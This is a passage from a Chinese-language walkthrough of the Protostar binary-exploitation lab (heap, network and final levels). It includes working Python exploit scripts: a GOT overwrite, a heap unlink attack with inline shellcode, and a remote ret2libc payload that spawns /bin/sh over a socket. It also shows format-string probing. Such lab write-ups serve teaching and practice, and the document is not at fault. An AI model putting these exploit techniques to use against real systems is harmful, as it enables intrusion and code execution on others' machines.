0x0804853d <main+132>:  mov    0xc(%ebp),%eax
0x08048540 <main+135>:  add    $0x8,%eax
0x08048543 <main+138>:  mov    (%eax),%eax
0x08048545 <main+140>:  mov    %eax,%edx
0x08048547 <main+142>:  mov    0x18(%esp),%eax
0x0804854b <main+146>:  mov    0x4(%eax),%eax
0x0804854e <main+149>:  mov    %edx,0x4(%esp)
0x08048552 <main+153>:  mov    %eax,(%esp)
0x08048555 <main+156>:  call   0x804838c <strcpy@plt>
0x0804855a <main+161>:  movl   $0x804864b,(%esp)
0x08048561 <main+168>:  call   0x80483cc <puts@plt>
0x08048566 <main+173>:  leave
---Type <return> to continue, or q <return> to quit---
0x08048567 <main+174>:  ret
End of assembler dump.

(gdb) b *0x08048566 #在程序最后leave退出时断点
Breakpoint 1 at 0x8048566: file heap1/heap1.c, line 35.

(gdb) r AAAABBBB 11112222 #运行 给junk数据
Starting program: /opt/protostar/bin/heap1 AAAABBBB 11112222
and that's a wrap folks!

(gdb) x/64wx 0x0804a008 #使用之前ltrace命令拿到的堆地址
0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
0x804a018:      0x41414141      0x42424242      0x00000000      0x00000011
0x804a028:      0x00000002      0x0804a038      0x00000000      0x00000011
0x804a038:      0x31313131      0x32323232      0x00000000      0x00020fc1
0x804a048:      0x00000000      0x00000000      0x00000000      0x00000000
#堆空间中的0x41 0x42 0x31 0x32为填入的junk 堆中的各个块之间的空隙 都是块的头信息
```

```python
#现在需要一个跳转的函数地址 该地址需要在触发strcpy之后 程序结束之前 只能是printf 即反汇编中因为没有格式化字符串而被编译器优化的puts函数
(gdb) disassemble 0x80483cc #反汇编查看puts函数
0x080483cc <puts@plt+0>:        jmp    *0x8049774
0x080483d2 <puts@plt+6>:        push   $0x30
0x080483d7 <puts@plt+11>:       jmp    0x804835c
End of assembler dump.
(gdb) x *0x8049774 #查看第一个jmp地址
0xb7ef4780 <_IO_puts>:  0x83e58955 #只要将此处的地址修改为winner函数的地址 再执行到puts就得以控制程序运行流程
(gdb) print winner
$1 = {void (void)} 0x8048494 <winner> #拿到winner地址
```

```python
#h1.py
#程序四次malloc堆中产生四个块 第1、3个块是i1、i2 它们包含了内部定义的priority、*name 而其中*name是个指针 它指向第2、4个块 其中存储着name的数据
#strcpy(i1->name, argv[1]);
#strcpy(i2->name, argv[2]);
#如下是堆中程序的示例

#           i1 我是第一个块               第二个块              i2 我是第三个块              第四个块
# 头信息     priority+*name    头信息    i1 -> name    头信息   priority+*name    头信息    i1 -> name    头文件....
#                                       垃圾数据从这里开始填充覆盖到这里的*name 
									#两个块4Byte 头信息1Byte 所以junk为5Byte
    
#执行strcpy(i2->name, argv[2]);时数据会从第三个块的*name指针 将数据传递给第四个块的name
#覆盖掉第三个块中的*name指针地址即可控制程序控制流程

#之前disassemble 0x80483cc反汇编查看puts函数中有一个指针地址jmp    *0x8049774
#将其中的指向地址改为winner地址即可 
arg1_padding = "AAAABBBBCCCCDDDDEEEE"
ret = "\x74\x97\x04\x08 " #0x08049774
arg2 = "\x94\x84\x04\x08" #address of main`s retaddr on stack 0x08048494
print arg1_padding + ret + arg2 #junk覆盖到*name为0x08049774 被修改后的*name变成传送通道将原有地址修改为winnner地址 执行puts时就会跳到此处
```

```shell
python h1.py > exp1.txt
./heap1 `cat exp1.txt`
```

#### Heap2

程序本身写的有问题，容易堆溢出。

```shell
./heap2
auth alice
service 111222333444555 #此处会在555溢出 从而控制程序流程
login
```

源码分析：

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h> //头文件

struct auth { //auth结构体
  char name[32]; //32Byte name
  int auth;
};

struct auth /指针
char *service; //指针

int main(int argc, char **argv)
{
  char line[128]; //开辟名为line的 128 Byte空间

  while(1) { //循环
    printf("[ auth = %p, service = %p ]\n", auth, service); //输出地址

    if(fgets(line, sizeof(line), stdin) == NULL) break; //fgets没有溢出漏洞 此处获取指定输入到line变量空间中 如果没输入直接退出
    
    if(strncmp(line, "auth ", 5) == 0) { //line数据如果是auth
      auth = malloc(sizeof(auth)); //分配与之大小相等的堆空间 此处是struct auth指针 所以只分配了8Byte 之所以不是4byte是因为malloc的对齐机制
      memset(auth, 0, sizeof(auth)); //把刚才分配的堆空间数据清除
      if(strlen(line + 5) < 31) { //如果字符个数+5的和 小于 31个
        strcpy(auth->name, line + 5); //将"auth "后的数据拷贝进auth结构体的name中
      }
    }
    if(strncmp(line, "reset", 5) == 0) { //如果输入的是reset 
      free(auth); //那么释放掉刚才的堆空间
    }
    if(strncmp(line, "service", 6) == 0) { //如果输入的是service
      service = strdup(line + 7); //那么把数据拷贝到堆上 但是它还会拷贝service后的空格 即\x20
    }
    if(strncmp(line, "login", 5) == 0) { //如果输入的是login
      if(auth->auth) { //只要数据不为0 转型为bool型直接转为1 即真 代码意为auth中有数据直接输出you have logged in already!
        printf("you have logged in already!\n");
      } else { //否则
        printf("please enter your password\n");
      }
    }
  }
}
```

```python
(gdb) r
Starting program: /opt/protostar/bin/heap2
[ auth = (nil), service = (nil) ]
auth alice
[ auth = 0x804c008, service = (nil) ]
service 111
[ auth = 0x804c008, service = 0x804c018 ]
service 222
[ auth = 0x804c008, service = 0x804c028 ]
service 333
[ auth = 0x804c008, service = 0x804c038 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c038 ]
^C
Program received signal SIGINT, Interrupt.
0xb7f53c1e in __read_nocancel () at ../sysdeps/unix/syscall-template.S:82
82      ../sysdeps/unix/syscall-template.S: No such file or directory.
        in ../sysdeps/unix/syscall-template.S
Current language:  auto
The current source language is "auto; currently asm".
(gdb) x/32wx 0x804c000 #源程序中32Byte的name后就是auth，即第9个4Byte处数据不为0即溢出成功 地址为0x804c029 也就是下面数据为0x32323220的位置
0x804c000:      0x00000000      0x00000011      0x63696c61      0x00000a65 #\x61\x6c\x69\x63\x65 = alice 十六进制ASCII码
0x804c010:      0x00000000      0x00000011      0x31313120      0x0000000a #\x31 = 1 十六进制 1 | ASCII码值 \x20 = 空格
0x804c020:      0x00000000      0x00000011      0x32323220      0x0000000a #\x32 = 2 十六进制 2 | ASCII码值 \x20 = 空格
0x804c030:      0x00000000      0x00000011      0x33333320      0x0000000a #\x33 = 3 十六进制 3 | ASCII码值 \x20 = 空格
0x804c040:      0x00000000      0x00000fc1      0x00000000      0x00000000 
0x804c050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000000
```

#### Heap3

首先确定`malloc`版本

```shell
root@protostar:/# ldd --version
ldd (Debian EGLIBC 2.11.2-10) 2.11.2
Copyright (C) 2009 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
```

[Index of /gnu/glibc](http://ftp.gnu.org/gnu/glibc/) glibc源代码 根据自己glibc版本选择下载 查看源码确定攻击细节
**如若bin中已有一个trunk，但堆中与之相邻的trunk如被free就会触发unlink，将它从bin中unlink出来进行合并后再把这个新trunk放入bin中。**

![image-20230306151514081](./Pwn/unlink.png)

因为trunk的头信息一般是8/12字节，所以是在p/q偏移8/12字节处填入指针的。

![image-20230306151944761](./Pwn/HackBin.png)

**当通过node的指针过后，程序将不再把数据识别为node，而是识别为trunk。**

![image-20230306152502559](./Pwn/unlinkHackSucc.png)

之所以不直接给`q`写入`winner`地址是因为，在`winner`8字节后写入`*p`是做不到的，因为`winner`8字节后是代码段，可读不可写，会导致Segmentation fault。

```
攻击目的在于构造伪造的堆，触发非正常的unlink。 方法：利用 a / b 的堆溢出
```

![image-20230306154932067](./Pwn/Protostar_heap3.png)

![image-20230306155127347](./Pwn/Protostar_heap3_2.png)

注入junk数据测试出堆空间的trunk布局，通过调试获取地址

```python
(gdb) b free #在free处下个断点方便在运行时查看程序池
Breakpoint 1 at 0x804982a: file common/malloc.c, line 3583.
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC #abc三个变量程序中都为32
Starting program: /opt/protostar/bin/heap3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC																	#所以A*32 B*32 C*32 

Breakpoint 1, free (mem=0x804c058) at common/malloc.c:3583
3583    common/malloc.c: No such file or directory.
        in common/malloc.c
(gdb) info proc map #因为有了断点 并且程序已经运行 所以直接查看程序池获取堆地址
process 2472
cmdline = '/opt/protostar/bin/heap3'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/heap3'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x804b000     0x3000          0        /opt/protostar/bin/heap3
         0x804b000  0x804c000     0x1000     0x3000        /opt/protostar/bin/heap3
         0x804c000  0x804d000     0x1000          0           [heap] #得到堆地址为0x804c000
        0xb7e96000 0xb7e97000     0x1000          0
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0
        0xb7fe0000 0xb7fe2000     0x2000          0
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) x/64wx 0x804c000 #直接查看堆地址 再根据32个 A / B / C 的 ASCII码值在堆中的位置来确定攻击paload的编写
0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
0x804c010:      0x41414141      0x41414141      0x41414141      0x41414141
0x804c020:      0x41414141      0x41414141      0x00000000      0x00000029
0x804c030:      0x42424242      0x42424242      0x42424242      0x42424242
0x804c040:      0x42424242      0x42424242      0x42424242      0x42424242
0x804c050:      0x00000000      0x00000029      0x43434343      0x43434343
0x804c060:      0x43434343      0x43434343      0x43434343      0x43434343
0x804c070:      0x43434343      0x43434343      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0a0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0f0:      0x00000000      0x00000000      0x00000000      0x00000000
(gdb) print winner 
$1 = {void (void)} 0x8048864 <winner> #拿到winner地址
```

```python
#exploit unlink(b)
a = "A"*4 #junk占位 如不需要则更改后续修改puts_got中shellcode的地址
a += "\x68\x64\x88\x04\x08\xc3" #用winner地址构造的shellcode 其中含有0x8048864地址 68机器码为PUSH 16位立即数值 即16位地址 C3机器码为RET 
a += "A"*22 #占位 使位置来到b_trunk的头信息处 即 prev_size 和 size

#overflow into b
a += "\xf8\xff\xff\xff" #0xfffffff8
#eip需要从此处向后移动8位
#fffffff8 = -8,然后依据prev size计算出b的前一块地址:*b - (-8) = *b + 8，prev size向下8位到了"A"*8的fake块
a += "\xfc\xff\xff\xff" #0xfffffffc
#free(b)时会先检查b的size字段，二进制0xfffffffc下尾部为1100，尾部0表示前一块node是free的可以考虑unlink再合并
#为了使 size 尾部二进制数据为 0 造成合并 trunk 同时只有当合并的大小超出特定阈值的时候才会触发合并
#且上一个trunk的大小要足够大而保证 payload 的 string 不会被分割 所以在尽可能大的情况下使用 0xfffffffc

b = "A"*8 #计算b的下一个trunk地址位置+8后 此处fake的junk数据没被执行 而是落到了下面的地址数据 这是老版本dl_malloc的bug 新版已修复
b += "\x1c\xb1\x04\x08" #0x0804b11c 紧接着跳到puts_got的地址入口处 后面的数据向这个入口写入
#(gdb) disaseemble main
#0x08048935 <main+172>:  call   0x8048790 <puts@plt>
#(gdb) disassemble 0x8048790
#Dump of assembler code for function puts@plt:
#0x08048790 <puts@plt+0>:        jmp    *0x804b128
#0x08048796 <puts@plt+6>:        push   $0x68
#0x0804879b <puts@plt+11>:       jmp    0x80486b0
#End of assembler dump.
#0x804b128 - 0xC = 0x0804b11c 如此得到puts_got-12地址

b += "\x0c\xc0\x04\x08" #0x0804c00c shellcode填入堆中后所在的地址 
#该地址从puts_got的地址入口写入 当程序运行到printf函数时就会执行到此处并运行shellcode

c = "CCCC" #什么都没干 无所谓 占位用 作为程序中c变量的参数

print a + " " + b + " " + c #作为 a b c 传入的三个参数进行攻击 所以中间使用空格隔开
```

```python
root@protostar:/opt/protostar/bin# python exp.py > exp.txt
root@protostar:/opt/protostar/bin# ./heap3 `cat exp.txt`
that wasn't too bad now, was it? @ 1678090547
```

### Network Programming

#### Net0

```c
#include "../common/common.c" //引用了作者自己其他目录下的c文件
//定义了4个宏
#define NAME "net0"
#define UID 999
#define GID 999
#define PORT 2999

void run()
{
  unsigned int i;
  unsigned int wanted;

  wanted = random(); //产生一个随机数

  printf("Please send '%d' as a little endian 32bit int\n", wanted); //输出这个随机数

  if(fread(&i, sizeof(i), 1, stdin) == NULL) {
//调用 fread 函数从标准输入流(stdin)中读取一个大小为 i 的数据单元 并把它存储在 i 的地址中 如果读取成功 fread 函数会返回1表示读取了一个数据单元 如果读取失败 fread 函数会返回NULL表示发生了错误或者到达了文件末尾
      errx(1, ":(\n"); //读取失败后调用 errx 函数输出错误信息 “:(\n” 并退出程序
  }

  if(i == wanted) {
      printf("Thank you sir/madam\n");
  } else {
      printf("I'm sorry, you sent %d instead\n", i);
  }
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); //创建了一个后台进程
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT); //打开并指定了端口号

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd); //建立标准IO流

  /* Don't do this :> */
  srandom(time(NULL)); //赋予随机数生成种子

  run(); //调用run函数
}
```

```python
root@protostar:/opt/protostar/bin# ./net0
root@protostar:/opt/protostar/bin# netcat -v localhost 2999
Warning: inverse host lookup failed for 127.0.0.1: Unknown host
localhost.localdomain [127.0.0.1] 2999 (?) open
Please send '606828072' as a little endian 32bit int
606828072 #输入的数据因为大小端问题 
I'm sorry, you sent 943075382 instead
```

```python
import socket
import struct #替换大小端序的库
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
#创建一个使用 IPv4 和 TCP 的套接字对象并把它赋值给 s 变量
#调用 socket 模块中的 socket 函数，并传递两个参数：socket.AF_INET 和 socket.SOCK_STREAM
#socket.AF_INET // 常量 它表示地址族(address family)的类型 地址族是指套接字使用的网络协议类型 socket.AF_INET 表示使用 IPv4 协议
#socket.SOCK_STREAM // 常量 它表示套接字类型(socket type) 套接字类型是指套接字使用的传输层协议类型 socket.SOCK_STREAM 表示使用 TCP 协议
s.connect(('localhost', 2999)) #本地连接2999端口程序
challenge = s.recv(1024) #接收程序输出的1024bit
print ">>>>> RECV MSG:" + challenge #输出 "程序输出的信息"
start = challenge.find("'") + 1 #find查询并返回下标位置 用单引号来找程序输出的数字 单引号的下一个字符开始就是数字 所以是+1
end = challenge.find("'", start) #从start开始寻找单引号 返回在此之后找到的单引号下标 因此取得数字的下标区间
num = challenge[start:end] #截取数字 左开右闭 所以end作为后单引号下标没有问题
print ">>>>> RECV NUM:" + num #输出数字
num = int(num) #字符串转整型数字
little_endian = struct.pack("<I", num) #转小端序
print ">>>>> SEND INFO:" + str(little_endian) #转成字符输出给用户看
s.send(little_endian) #将转小端序后的数据发送过去
print ">>>>> RECV MSG:" + s.recv(1024) #输出 "程序返回的信息"
s.close() #关闭连接流
```

#### Net1

分析源程序后程序会输出随机值，再输入给对端一个值，只要二者相等即可，接收并发送回对端机器完成攻击。

```python
root@protostar:/opt/protostar/bin# ./net1
root@protostar:/opt/protostar/bin# netcat -v localhost 2998
```

```python
import socket
import struct
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 2998))
challenge = s.recv(1024)
print ">>>>> RECV CHALLENGE:" + challenge
data = struct.unpack("<I", challenge)[0]
res = str(data)
print ">>>>> DATA UNPACK:" + res
s.send(res)
print ">>>>> RECV MSG:" + s.recv(1024)
s.close()
```

#### Net2

根据源代码分析，得知需要将程序输出的值求和并发送给对端机器完成pwn。

```python
root@protostar:/opt/protostar/bin# ./net2
root@protostar:/opt/protostar/bin# netcat -v localhost 2997
```

```python
import socket
import struct
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 2997))
sum = 0
for i in range(4):
        data = s.recv(1024)
        num = int(struct.unpack("<I", data)[0])
        print ">>>>> RECV:" + str(num)
        sum += num
print ">>>>> RECV SUM:" + str(sum)
sum = struct.pack("<I", sum)
s.send(str(sum))
print ">>>>> RECV MSG:" + s.recv(1024)
s.close()
```

### Final Challenge

#### Final0

```c
#include "../common/common.c"

#define NAME "final0"
#define UID 0
#define GID 0
#define PORT 2995

/*
 * Read the username in from the network
 */

char *get_username()
{
  char buffer[512];
  char *q;
  int i;

  memset(buffer, 0, sizeof(buffer)); //清楚buffer范围内的数据
  gets(buffer); //获取输入

  /* Strip off trailing new line characters */
  q = strchr(buffer, '\n'); //去除输入的回车
  if(q) *q = 0;
  q = strchr(buffer, '\r'); //去除输入的换行
  if(q) *q = 0;

  /* Convert to upper case */
  for(i = 0; i < strlen(buffer); i++) {
      buffer[i] = toupper(buffer[i]); //将buffer内的小写字符转为大写
  } //但是此处有个问题 该循环是按照字符串的长度进行转换的 即遇到\0视为字符串结束 如果shellcode中出现\x00便会被截断
// 所以在shellcode的构造中需要避免\x00的存在

  /* Duplicate the string and return it */
  return strdup(buffer);
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  username = get_username();
  
  printf("No such user %s\n", username);
}
```

```python
(gdb) set disassembly-flavor intel #设置反汇编为intel格式
(gdb) disassemble get_username #反汇编程序内被调用的函数
Dump of assembler code for function get_username:
0x0804975a <get_username+0>:	push   ebp
0x0804975b <get_username+1>:	mov    ebp,esp
0x0804975d <get_username+3>:	push   ebx
0x0804975e <get_username+4>:	sub    esp,0x224
0x08049764 <get_username+10>:	mov    DWORD PTR [esp+0x8],0x200
0x0804976c <get_username+18>:	mov    DWORD PTR [esp+0x4],0x0
0x08049774 <get_username+26>:	lea    eax,[ebp-0x210]
0x0804977a <get_username+32>:	mov    DWORD PTR [esp],eax #从此处得知ebp-0x210为buffer的起点
0x0804977d <get_username+35>:	call   0x8048aec <memset@plt>
0x08049782 <get_username+40>:	lea    eax,[ebp-0x210]
0x08049788 <get_username+46>:	mov    DWORD PTR [esp],eax
0x0804978b <get_username+49>:	call   0x8048aac <gets@plt>
0x08049790 <get_username+54>:	mov    DWORD PTR [esp+0x4],0xa
0x08049798 <get_username+62>:	lea    eax,[ebp-0x210]
0x0804979e <get_username+68>:	mov    DWORD PTR [esp],eax
0x080497a1 <get_username+71>:	call   0x8048a9c <strchr@plt>
0x080497a6 <get_username+76>:	mov    DWORD PTR [ebp-0x10],eax
0x080497a9 <get_username+79>:	cmp    DWORD PTR [ebp-0x10],0x0
0x080497ad <get_username+83>:	je     0x80497b5 <get_username+91>
0x080497af <get_username+85>:	mov    eax,DWORD PTR [ebp-0x10]
0x080497b2 <get_username+88>:	mov    BYTE PTR [eax],0x0
0x080497b5 <get_username+91>:	mov    DWORD PTR [esp+0x4],0xd
---Type <return> to continue, or q <return> to quit---
0x080497bd <get_username+99>:	lea    eax,[ebp-0x210]
0x080497c3 <get_username+105>:	mov    DWORD PTR [esp],eax
0x080497c6 <get_username+108>:	call   0x8048a9c <strchr@plt>
0x080497cb <get_username+113>:	mov    DWORD PTR [ebp-0x10],eax
0x080497ce <get_username+116>:	cmp    DWORD PTR [ebp-0x10],0x0
0x080497d2 <get_username+120>:	je     0x80497da <get_username+128>
0x080497d4 <get_username+122>:	mov    eax,DWORD PTR [ebp-0x10]
0x080497d7 <get_username+125>:	mov    BYTE PTR [eax],0x0
0x080497da <get_username+128>:	mov    DWORD PTR [ebp-0xc],0x0
0x080497e1 <get_username+135>:	jmp    0x8049807 <get_username+173>
0x080497e3 <get_username+137>:	mov    ebx,DWORD PTR [ebp-0xc]
0x080497e6 <get_username+140>:	mov    eax,DWORD PTR [ebp-0xc]
0x080497e9 <get_username+143>:	movzx  eax,BYTE PTR [ebp+eax*1-0x210]
0x080497f1 <get_username+151>:	movsx  eax,al
0x080497f4 <get_username+154>:	mov    DWORD PTR [esp],eax
0x080497f7 <get_username+157>:	call   0x8048adc <toupper@plt>
0x080497fc <get_username+162>:	mov    BYTE PTR [ebp+ebx*1-0x210],al
0x08049803 <get_username+169>:	add    DWORD PTR [ebp-0xc],0x1
0x08049807 <get_username+173>:	mov    ebx,DWORD PTR [ebp-0xc]
0x0804980a <get_username+176>:	lea    eax,[ebp-0x210]
0x08049810 <get_username+182>:	mov    DWORD PTR [esp],eax
0x08049813 <get_username+185>:	call   0x8048b8c <strlen@plt>
0x08049818 <get_username+190>:	cmp    ebx,eax
---Type <return> to continue, or q <return> to quit---
0x0804981a <get_username+192>:	jb     0x80497e3 <get_username+137>
0x0804981c <get_username+194>:	lea    eax,[ebp-0x210]
0x08049822 <get_username+200>:	mov    DWORD PTR [esp],eax
0x08049825 <get_username+203>:	call   0x8048c7c <strdup@plt>
0x0804982a <get_username+208>:	add    esp,0x224
0x08049830 <get_username+214>:	pop    ebx
0x08049831 <get_username+215>:	pop    ebp
0x08049832 <get_username+216>:	ret    
End of assembler dump.
```

```python
+----------+
|          |
+----------+ <=== buffer
|          |
|   0x200  |
|          |
+----------+
|   0x10   |
+----------+ <=== ebp
| old ebp  |   0x4 (lengh)
+----------+
| ret addr | ===> execve #如果需要覆盖到此处的返回地址 则需要覆盖 0x200 + 0x10 +0x4 = 0x214 = 532(十进制)
+----------+
```

```python
+----------+
|          |
+----------+ <=== buffer
|          |
|   0x200  |
|          |
+----------+
|   0x10   |
+----------+ <=== ebp
| old ebp  |
+----------+
|  execve  |
+----------+
|ret "AAAA"| #执行完execve的返回地址 但是执行后返回到哪无所谓了 所以随便填用于占位
+----------+
|  /bin/sh | #需要从程序内找 而不是直接写字符串"/bin/sh"
+----------+
```

**如下将是payload中将会用到的地址的获取方法：**

```python
root@protostar:/opt/protostar/bin# objdump -dj .plt /opt/protostar/bin/final0 | grep execve
08048c0c <execve@plt>: #拿到execve地址
root@protostar:/opt/protostar/bin#gdb final0
(gdb) b main
Breakpoint 1 at 0x804983c: file final0/final0.c, line 42.
(gdb) r
Starting program: /opt/protostar/bin/final0 

Breakpoint 1, main (argc=1, argv=0xbffff864, envp=0xbffff86c)
    at final0/final0.c:42
42	final0/final0.c: No such file or directory.
	in final0/final0.c
(gdb) info proc map
process 2104
cmdline = '/opt/protostar/bin/final0'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/final0'
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x804a000     0x2000          0        /opt/protostar/bin/final0
	 0x804a000  0x804b000     0x1000     0x1000        /opt/protostar/bin/final0
	0xb7e96000 0xb7e97000     0x1000          0        
	0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so #此处拿到libc基址为0xb7e97000
	0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
	0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
	0xb7fd9000 0xb7fdc000     0x3000          0        
	0xb7fe0000 0xb7fe2000     0x2000          0        
	0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
	0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
	0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
	0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
	0xbffeb000 0xc0000000    0x15000          0           [stack]
root@protostar:/opt/protostar/bin# ldd final0
	linux-gate.so.1 =>  (0xb7fe4000)
	libc.so.6 => /lib/libc.so.6 (0xb7e99000) #查看使用的链接库路径
	/lib/ld-linux.so.2 (0xb7fe5000)
root@protostar:/opt/protostar/bin# strings -t d /lib/libc.so.6 | grep "/bin/sh"
1176511 /bin/sh #拿到偏移 将libc基址+binsh偏移即可得到程序内binsh的绝对位置 即0xb7e97000 + 1176511
```

**因为程序是从gets函数处栈溢出，所以它将不会再有main函数中输出username的环节，即hacked之后程序不会有回应。因此需要继续向程序发送可执行的命令，如让它echo字符串，只要接收到了即可知道程序已经被HACK。**

```python
import socket
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 2995))
print "Connect success!"

junk = 'A'*0x200 + '\x00' + 'A'*(0x10 - 1) + 'A'*0x4 #\x00表示A字符串输入完毕 后面的数据正常覆盖
execve = struct.pack("I", 0x08048c0c) #"I"表示打包
binsh = struct.pack("I", 0xb7e97000 + 1176511)
payload = junk + execve + "AAAA" + binsh + '\x00'*5 #"\x00" 4个以上表示payload已经结束
s.send(payload + '\n') #发送payload 注意必须有\n 表示攻击后回车确定
s.send("echo This is cool!\n") #对端机器收到payload执行execve('/bin/sh')后等待输入 发送一个命令带有\n表示回车确定
print "RECV MSG:" + s.recv(1024) #接收命令输出的内容 确认payload执行成功已将对端机器成功HACK掉了
print ">>>>> PROGRAMMING HACKED!" #运行到此处已经成功
s.close() #关闭连接流
```

#### Final1

[Protostar final1_weixin_34198762的博客-CSDN博客](https://blog.csdn.net/weixin_34198762/article/details/92283741?ops_request_misc=&request_id=&biz_id=102&utm_term=protostar_final1&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-92283741.142^v73^pc_search_v2,201^v4^add_ask,239^v2^insert_chatgpt&spm=1018.2226.3001.4187)

```c
//程序分析：
void logit(char *pw)
{
  char buf[512];
  //输出登陆失败信息到buf中
  snprintf(buf, sizeof(buf), "Login from %s as [%s] with password [%s]\n", hostname, username, pw);
  
  syslog(LOG_USER|LOG_DEBUG, buf); //将buf内容记入syslog 要查看syslog需要root权限
  //此处有格式化字符串 调用syslog写入的时候 buf中编写的%n攻击就会触发栈空间的任意读写
}
void parser()
{
  char line[128];

  printf("[final1] $ ");

  while(fgets(line, sizeof(line)-1, stdin)) { //获取用户输入
      trim(line); //去除\r\n
      if(strncmp(line, "username ", 9) == 0) { //比较字符是否为"username " 如果是则执行代码块
          strcpy(username, line+9); //截取"username "后的字符并写入username变量中
      } else if(strncmp(line, "login ", 6) == 0) { //比较字符是否为"login " 如果是则执行代码块
          if(username[0] == 0) { 
              printf("invalid protocol\n");
          } else { //如果写入username变量的第一个字符不为0
              logit(line + 6); //将输入长度+6的和 作为参数传给logit函数
              printf("login failed\n");
          }
      }
      printf("[final1] $ ");
  }
}
```

```python
#计算偏移：
root@protostar:/opt/protostar/bin# ./final1
root@protostar:/opt/protostar/bin# netcat -v localhost 2994
Warning: inverse host lookup failed for 127.0.0.1: Unknown host
localhost.localdomain [127.0.0.1] 2994 (?) open
[final1] $ username AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
[final1] $ login 123456
login failed
root@protostar:/opt/protostar/bin# cat /var/log/syslog | grep AAAA
Mar  9 08:42:27 (none) final1: Login from 127.0.0.1:56344 as [AAAA08049ee4.0804a2a0.0804a220.bffffbd6.b7fd7ff4.bffffa28.69676f4c.7266206e.31206d6f.302e3732.312e302e.3336353a.61203434.415b2073.25414141.2e783830.] with password [123456] #从这里".415b2073.25414141."发现没有对齐 多输入字符对齐
```

```python
#对齐字符：
root@protostar:/opt/protostar/bin# netcat -v localhost 2994
Warning: inverse host lookup failed for 127.0.0.1: Unknown host
localhost.localdomain [127.0.0.1] 2994 (?) open
[final1] $ username XDDDD%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x. #再次对齐
[final1] $ login 123456
login failed
root@protostar:/opt/protostar/bin# cat /var/log/syslog | grep DDDD
Mar  9 08:45:04 (none) final1: Login from 127.0.0.1:56345 as [XDDDD08049ee4.0804a2a0.0804a220.bffffbd6.b7fd7ff4.bffffa28.69676f4c.7266206e.31206d6f.302e3732.312e302e.3336353a.61203534.585b2073.44444444.78383025.] with password [123456] #这里44444444已经对齐了 在第15个参数 即有14个dword的偏移
```

![image-20230311204154293](./Pwn/Protostar_final1.png)

```python
#获取地址：
root@protostar:/opt/protostar/bin# objdump -R /opt/protostar/bin/final1 | grep syslog
0804a11c R_386_JUMP_SLOT   syslog #拿到syslog_got地址为0x0804a11c
#shellcode可以用kali自带的metasploit生成
```

ShellCode：
可以用Kali的metasploit来生成Shellcode，将shellcode放入pw字段中，即"login "之后

```python
